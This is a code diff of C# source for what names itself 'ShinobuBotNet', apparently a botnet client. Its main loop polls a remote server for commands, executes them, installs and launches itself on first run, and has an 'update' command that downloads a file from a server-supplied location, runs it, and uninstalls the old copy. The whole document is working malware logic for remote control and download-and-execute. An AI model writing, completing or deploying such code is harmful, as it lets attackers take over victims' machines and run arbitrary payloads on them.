@@ -17,35 +17,27 @@ namespace ShinobuBotNet
 
         static void Main(string[] args)
         {
-            if (check.CheckDir() == true)
+
+            if (File.Exists(config.CheakFile))
             {
-                if (System.IO.File.Exists(config.CheakFile))
+                while (true)
                 {
-                    while (true)
+                    string id = API.Get_ID();
+                    string html = API.GetCommand(id);
+
+                    if (last_cmd == html)
                     {
-                        string id = API.Get_ID();
-                        string html = API.GetCommand(id);
-                        if (html == "null")
-                        {
-                            continue;
-                        }
-
-                        if (last_cmd == html)
-                        {
-                            Thread.Sleep(config.delay);
-                            continue;
-                        }
-                        last_cmd = html;
-
-                        cmd command = new cmd(html);
-                        Execute(command);
-
                         Thread.Sleep(config.delay);
+                        continue;
                     }
+                    last_cmd = html;
+
+                    cmd command = new cmd(html);
+                    Execute(command);
+
+                    Thread.Sleep(config.delay);
                 }
             }
-
-
             else
             {
                 //install
@@ -55,7 +47,9 @@ namespace ShinobuBotNet
                 //connect
                 API.connect();
                 API.creat_cheak_File();
-                install.Reboot();
+                utils.run(config.InstallPath);
+
+                
             }
 
             void Execute(cmd CMD)
@@ -105,6 +99,9 @@ namespace ShinobuBotNet
                     case "update":
                         string file = web.DownloadFile(CMD.ComContent);
                         utils.run(file);
+                        install.uninstallSelf();
+                        break;
+                    case "null":
                         break;
                 }
             }
